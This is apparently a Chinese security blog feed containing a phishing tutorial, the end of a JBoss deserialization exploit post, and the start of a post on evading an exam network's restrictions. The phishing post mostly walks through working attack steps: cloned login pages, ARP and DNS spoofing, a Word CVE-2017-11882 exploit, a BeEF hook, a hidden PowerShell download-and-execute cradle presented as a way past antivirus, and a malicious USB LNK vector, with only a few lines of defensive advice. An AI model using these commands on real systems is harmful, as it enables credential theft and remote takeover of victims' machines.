<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180843_FQh3jJ_6316.jpeg" alt=""></p>
<h3 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3). 信息收集"></a>3). 信息收集</h3><h4 id="第一步：利用nmap对目标主机进行常用端口扫描"><a href="#第一步：利用nmap对目标主机进行常用端口扫描" class="headerlink" title="第一步：利用nmap对目标主机进行常用端口扫描"></a>第一步：利用nmap对目标主机进行常用端口扫描</h4><blockquote>
<p>nmap 192.168.1.111 -A </p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180855_12YJ7L_6329.jpeg" alt=""></p>
<h4 id="第二步：访问目标主机的8080端口，看看能否正常访问"><a href="#第二步：访问目标主机的8080端口，看看能否正常访问" class="headerlink" title="第二步：访问目标主机的8080端口，看看能否正常访问"></a>第二步：访问目标主机的8080端口，看看能否正常访问</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180912_UQjhJU_6322.jpeg" alt=""></p>
<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4). 漏洞利用"></a>4). 漏洞利用</h3><h4 id="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar"><a href="#利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar" class="headerlink" title="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar"></a>利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180923_jatTku_6333.jpeg" alt=""></p>
<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02. 总结"></a>0x02. 总结</h2><h4 id="emsp-emsp-行千里路，不如读万卷书…"><a href="#emsp-emsp-行千里路，不如读万卷书…" class="headerlink" title="&emsp;&emsp;行千里路，不如读万卷书…"></a>&emsp;&emsp;行千里路，不如读万卷书…</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[花式钓鱼法]]></title>
      <url>/2017/12/27/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/</url>
      <content type="html"><![CDATA[<h2 id="0x00-闲谈"><a href="#0x00-闲谈" class="headerlink" title="0x00. 闲谈"></a>0x00. 闲谈</h2><h4 id="emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"><a href="#emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。" class="headerlink" title="&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"></a>&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。</h4><a id="more"></a>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182440_peGRkR_6191.jpeg" alt=""></p>
<h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01. 环境配置"></a>0x01. 环境配置</h2><h3 id="1-环境准备："><a href="#1-环境准备：" class="headerlink" title="1). 环境准备："></a>1). 环境准备：</h3><h3 id="1-kali-linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）"><a href="#1-kali-linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）" class="headerlink" title="1. kali linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）"></a>1. kali linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）</h3><h3 id="2-windows-xp"><a href="#2-windows-xp" class="headerlink" title="2. windows xp"></a>2. windows xp</h3><h3 id="3-window-7"><a href="#3-window-7" class="headerlink" title="3. window 7"></a>3. window 7</h3><h1 id="情景一："><a href="#情景一：" class="headerlink" title="情景一："></a>情景一：</h1><blockquote>
<p>利用Java Applet 进行钓鱼，不过现在的浏览器已经开始禁止这些插件了，要利用这种情景最好先做好前期的信息收集，判断目标是否支持Java Applet</p>
</blockquote>
<h4 id="第一步：下载最新的-setookit-工具包，也可以使用kali自带的S-E-T"><a href="#第一步：下载最新的-setookit-工具包，也可以使用kali自带的S-E-T" class="headerlink" title="第一步：下载最新的 setookit 工具包，也可以使用kali自带的S.E.T"></a>第一步：下载最新的 setookit 工具包，也可以使用kali自带的S.E.T</h4><blockquote>
<p>git clone <a href="https://github.com/trustedsec/social-engineer-toolkit.git" target="_blank" rel="external">https://github.com/trustedsec/social-engineer-toolkit.git</a></p>
</blockquote>
<h4 id="第二步：配置JAVA-REAPETER-ON-让基于Java-Applet-的警告窗不停的弹出，使攻击更容易成功"><a href="#第二步：配置JAVA-REAPETER-ON-让基于Java-Applet-的警告窗不停的弹出，使攻击更容易成功" class="headerlink" title="第二步：配置JAVA REAPETER = ON 让基于Java Applet 的警告窗不停的弹出，使攻击更容易成功"></a>第二步：配置JAVA REAPETER = ON 让基于Java Applet 的警告窗不停的弹出，使攻击更容易成功</h4><blockquote>
<p>vim /etc/setoolkit/set.config</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182513_m24bV3_6241.jpeg" alt=""></p>
<h4 id="第三步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听"><a href="#第三步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听" class="headerlink" title="第三步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听"></a>第三步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听</h4><blockquote>
<p>setookit</p>
<p>依次按照如下顺序：1&emsp;2&emsp;1&emsp;2&emsp;no&emsp;回车&emsp;2&emsp;www.baidu.com&emsp;1&emsp;443&emsp;1 </p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182524_72fK5L_6258.jpeg" alt=""></p>
<h4 id="第四步：配置metasploit-设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听"><a href="#第四步：配置metasploit-设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听" class="headerlink" title="第四步：配置metasploit 设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听"></a>第四步：配置metasploit 设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听</h4><blockquote>
<p>kill 0</p>
<p>set exitonsession false</p>
<p>set autorunscript migrate -f</p>
<p>run -j</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182535_47xLHO_6268.jpeg" alt=""></p>
<h4 id="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"><a href="#第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）" class="headerlink" title="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"></a>第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182544_uI1YdI_6356.jpeg" alt=""></p>
<hr>
<h1 id="情景二："><a href="#情景二：" class="headerlink" title="情景二："></a>情景二：</h1><blockquote>
<p>利用浏览器漏洞和中间人攻击进行钓鱼，不过这个漏洞已经比较老了，笔者只在xp上成功过，不过这里提供一种思路，万一哪天IE又抽风来个CVE…</p>
</blockquote>
<h4 id="第一步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听"><a href="#第一步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听" class="headerlink" title="第一步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听"></a>第一步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听</h4><blockquote>
<p>setookit </p>
<p>依次按照如下顺序：1&emsp;2&emsp;2&emsp;1&emsp;no&emsp;回车&emsp;5&emsp;37&emsp;2&emsp;443</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182556_R3oubQ_6381.jpeg" alt=""></p>
<h4 id="第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个"><a href="#第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个" class="headerlink" title="第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个"></a>第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个</h4><blockquote>
<p>kill 0</p>
<p>set srvport 80</p>
<p>set exitonsession false</p>
<p>set autorunscript migrate -f</p>
<p>run -j</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182608_ZogrCp_6390.jpeg" alt=""></p>
<h4 id="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章"><a href="#第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章" class="headerlink" title="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇文章"></a>第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇<a href="https://times0ng.github.io/2017/10/02/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F-%E5%BA%8F%E7%AB%A0-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">文章</a></h4><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -t 192.168.1.110 -r 192.168.1.1</p>
<p>echo “192.168.1.111 *.wmpic.me” &gt; dnsspoof.host &amp;&amp; dnsspoof -i eth0 -f dnsspoof.host</p>
<p>[*]进行DNS投毒时经常会失败，笔者对这种情况也有点不解，不过当我用xp的IE浏览器访问<a href="http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell" target="_blank" rel="external">http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell</a></p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182624_rBdD7y_6403.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182639_NQ1Zpz_6410.jpeg" alt=""></p>
<hr>
<h1 id="情景三："><a href="#情景三：" class="headerlink" title="情景三："></a>情景三：</h1><blockquote>
<p>钓鱼页面与beef结合，让鱼儿无处可逃</p>
</blockquote>
<h4 id="第一步：启动setookit-构造钓鱼页面"><a href="#第一步：启动setookit-构造钓鱼页面" class="headerlink" title="第一步：启动setookit 构造钓鱼页面"></a>第一步：启动setookit 构造钓鱼页面</h4><blockquote>
<p>setookit</p>
<p>依次按照如下顺序：1&emsp;2&emsp;3&emsp;1&emsp;local IP(192.168.1.111)&emsp;5</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182652_6jCVOg_6432.jpeg" alt=""></p>
<h4 id="第二步：启动beef，将HOOK代码嵌入钓鱼页面"><a href="#第二步：启动beef，将HOOK代码嵌入钓鱼页面" class="headerlink" title="第二步：启动beef，将HOOK代码嵌入钓鱼页面"></a>第二步：启动beef，将HOOK代码嵌入钓鱼页面</h4><blockquote>
<p>vim ~/.set/web_clone/index.html</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182704_1tJrZ6_6441.jpeg" alt=""></p>
<h4 id="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"><a href="#第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上" class="headerlink" title="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"></a>第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上</h4><blockquote>
<p><a href="http://192.168.1.111" target="_blank" rel="external">http://192.168.1.111</a></p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182719_DRT0dh_6448.jpeg" alt=""></p>
<h4 id="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"><a href="#第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！" class="headerlink" title="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"></a>第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182731_rP5b4s_6451.jpeg" alt=""></p>
<hr>
<h1 id="情景四："><a href="#情景四：" class="headerlink" title="情景四："></a>情景四：</h1><blockquote>
<p> 利用最新的word漏洞CVE-2017-11882钓鱼</p>
</blockquote>
<h4 id="第一步：下载EXP，并将EXP集成到msf的fileformat模块当中"><a href="#第一步：下载EXP，并将EXP集成到msf的fileformat模块当中" class="headerlink" title="第一步：下载EXP，并将EXP集成到msf的fileformat模块当中"></a>第一步：下载EXP，并将EXP集成到msf的fileformat模块当中</h4><blockquote>
<p>wget <a href="https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb" target="_blank" rel="external">https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb</a></p>
<p>mv office_ms17_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182749_4NZ76L_6464.jpeg" alt=""></p>
<h4 id="第二步：启动msf生成钓鱼word"><a href="#第二步：启动msf生成钓鱼word" class="headerlink" title="第二步：启动msf生成钓鱼word"></a>第二步：启动msf生成钓鱼word</h4><blockquote>
<p>reload_all</p>
<p>use exploit/windows/fileformat/office_ms17_11882</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182803_yEBCcc_6474.jpeg" alt=""></p>
<h4 id="第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了"><a href="#第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了" class="headerlink" title="第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了"></a>第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182814_BxOTQF_6481.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182825_2n8D2X_6483.jpeg" alt=""></p>
<hr>
<h1 id="情景五："><a href="#情景五：" class="headerlink" title="情景五："></a>情景五：</h1><blockquote>
<p>利用windows自带的powershell进行钓鱼，即发送bat文件，并将payload放到远程服务器，这样在一定程度上可以绕过杀软</p>
</blockquote>
<h4 id="第一步：下载并安装Empire，这里有Empire详细的使用教程"><a href="#第一步：下载并安装Empire，这里有Empire详细的使用教程" class="headerlink" title="第一步：下载并安装Empire，这里有Empire详细的使用教程"></a>第一步：下载并安装Empire，这里有Empire详细的<a href="https://xianzhi.aliyun.com/forum/topic/67/" target="_blank" rel="external">使用教程</a></h4><blockquote>
<p>git clone <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="external">https://github.com/EmpireProject/Empire</a></p>
</blockquote>
<h4 id="第二步：启动Empire生成payload"><a href="#第二步：启动Empire生成payload" class="headerlink" title="第二步：启动Empire生成payload"></a>第二步：启动Empire生成payload</h4><blockquote>
<p>launcher powershell times0ng</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182834_3NraFH_6547.jpeg" alt=""></p>
<h4 id="第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中"><a href="#第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中" class="headerlink" title="第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中"></a>第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中</h4><blockquote>
<p>service apache2 start</p>
<p>vim /var/www/html/empire.psl</p>
</blockquote>
<h4 id="第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"><a href="#第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软" class="headerlink" title="第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"></a>第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软</h4><blockquote>
<p>powershell -ExecutionPolicy Bypass -w hidden IEX(New-Object Net.Webclient).DownloadString(‘<a href="http://192.168.1.109/empire.psl" target="_blank" rel="external">http://192.168.1.109/empire.psl</a>‘)</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183043_KXE7fh_6557.jpeg" alt=""></p>
<h4 id="第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"><a href="#第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩" class="headerlink" title="第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"></a>第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183057_N8sfP9_6568.jpeg" alt=""></p>
<hr>
<h1 id="情景六："><a href="#情景六：" class="headerlink" title="情景六："></a>情景六：</h1><blockquote>
<p>利用USB社工钓鱼，记得当初看黑客军团时里面的黑客小姐姐就是利用BadUSB加社工黑进监狱的</p>
</blockquote>
<h4 id="第一步：利用msf生成攻击向量"><a href="#第一步：利用msf生成攻击向量" class="headerlink" title="第一步：利用msf生成攻击向量"></a>第一步：利用msf生成攻击向量</h4><blockquote>
<p>use exploit/windows/fileformat/cve_2017_8464_lnk_rce</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183113_tXAzGF_6507.jpeg" alt=""></p>
<h4 id="第二步：将攻击向量放到USB中，并启动msf监听"><a href="#第二步：将攻击向量放到USB中，并启动msf监听" class="headerlink" title="第二步：将攻击向量放到USB中，并启动msf监听"></a>第二步：将攻击向量放到USB中，并启动msf监听</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183126_dYJ5SW_6514.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183138_XzAql1_6518.jpeg" alt=""></p>
<h4 id="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"><a href="#第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行" class="headerlink" title="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"></a>第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183152_b9Kxw1_6527.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183205_jgJnId_6529.jpeg" alt=""></p>
<hr>
<h2 id="0x02-防御建议"><a href="#0x02-防御建议" class="headerlink" title="0x02. 防御建议"></a>0x02. 防御建议</h2><h4 id="多了解攻击手段，以攻代防，知己知彼"><a href="#多了解攻击手段，以攻代防，知己知彼" class="headerlink" title="[*] 多了解攻击手段，以攻代防，知己知彼"></a>[*] 多了解攻击手段，以攻代防，知己知彼</h4><h4 id="不要轻易打开任何可执行文件"><a href="#不要轻易打开任何可执行文件" class="headerlink" title="[*] 不要轻易打开任何可执行文件"></a>[*] 不要轻易打开任何可执行文件</h4><h4 id="不要轻易点击陌生链接"><a href="#不要轻易点击陌生链接" class="headerlink" title="[*] 不要轻易点击陌生链接"></a>[*] 不要轻易点击陌生链接</h4><h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"><a href="#emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…" class="headerlink" title="&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"></a>&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[RINET 的妙用]]></title>
      <url>/2017/12/23/RINETD%E7%9A%84%E5%A6%99%E7%94%A8/</url>
      <content type="html"><![CDATA[<h2 id="0x00-闲言"><a href="#0x00-闲言" class="headerlink" title="0x00. 闲言"></a>0x00. 闲言</h2><h4 id="emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"><a href="#emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。" class="headerlink" title="&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"></a>&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。</h4><a id="more"></a>
<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01. 环境搭建"></a>0x01. 环境搭建</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备:"></a><strong>环境准备:</strong></h3><h4 id="emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104"><a href="#emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104" class="headerlink" title="&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104"></a>&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104</h4><h4 id="emsp-emsp-2-win-xp-emsp-IP-1-1-1-103"><a href="#emsp-emsp-2-win-xp-emsp-IP-1-1-1-103" class="headerlink" title="&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103"></a>&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103</h4><h4 id="emsp-emsp-3-win-xp-emsp-IP-192-168-1-109"><a href="#emsp-emsp-3-win-xp-emsp-IP-192-168-1-109" class="headerlink" title="&emsp;&emsp;3. win xp &emsp; IP = 